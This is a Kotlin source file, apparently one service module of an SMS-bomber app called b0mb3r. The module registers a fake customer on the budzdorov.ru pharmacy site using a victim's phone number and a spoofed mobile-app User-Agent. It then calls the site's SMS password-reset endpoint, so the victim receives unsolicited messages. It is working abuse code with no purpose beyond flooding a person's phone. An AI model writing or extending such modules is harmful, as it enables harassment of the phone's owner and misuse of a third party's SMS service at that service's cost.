package kotleni.b0mb3r.services

import okhttp3.Call
import okhttp3.OkHttpClient
import okhttp3.Request.Builder
import okhttp3.Callback
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import org.json.JSONObject
import org.json.JSONException
import okhttp3.RequestBody
import okhttp3.Response
import java.io.IOException

class BudZdorov : Service() {
    override fun run(callback: Callback) {
        val main = JSONObject()
        val customer = JSONObject()
        val extension = JSONObject()
        try {
            extension.put("is_subscribed", "false")
            extension.put("telephone", format(formattedPhone, "+* (***) ***-**-**"))
            extension.put("via_sms_notify", "true")
            extension.put("favorite_store_point", "0")
            extension.put("device_uu_id", "2652f89e-97e4-49dd-9ccf-c94c3226de59")
            customer.put("email", getEmail())
            customer.put("firstname", "Иван")
            customer.put("middlename", "Иванович")
            customer.put("lastname", "Иванов")
            customer.put("extension_attributes", extension)
            main.put("customer", customer)
        } catch (e: JSONException) {
            e.printStackTrace()
        }
        client.newCall(
            Builder()
                .url("https://www.budzdorov.ru/rest/V1/recaptcha/customers")
                .header(
                    "User-Agent",
                    "RiglaMobileClient(android Android-Q-build-20210804020623 2.10.2 (stable) (Tue Oct 13 15:50:27 2020 +0200) on 'android_arm64')"
                )
                .header("platform", "android")
                .post(RequestBody.create("application/json".toMediaTypeOrNull(), main.toString()))
                .build()
        ).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                callback.onFailure(call, e)
            }

            override fun onResponse(call: Call, response: Response) {
                val data = JSONObject()
                try {
                    data.put("contact", format(formattedPhone, "+* (***) ***-**-**"))
                    data.put("type", "telephone")
                    data.put("template", "email_reset")
                    data.put("websiteId", "0")
                } catch (e: JSONException) {
                    e.printStackTrace()
                }
                client.newCall(
                    Builder()
                        .url("https://www.budzdorov.ru/rest/V1/customers/smsAccount/password")
                        .header(
                            "User-Agent",
                            "RiglaMobileClient(android Android-Q-build-20210804020623 2.10.2 (stable) (Tue Oct 13 15:50:27 2020 +0200) on 'android_arm64')"
                        )
                        .header("platform", "android")
                        .put(RequestBody.create("application/json".toMediaTypeOrNull(), data.toString()))
                        .build()
                ).enqueue(callback)
            }
        })
    }
}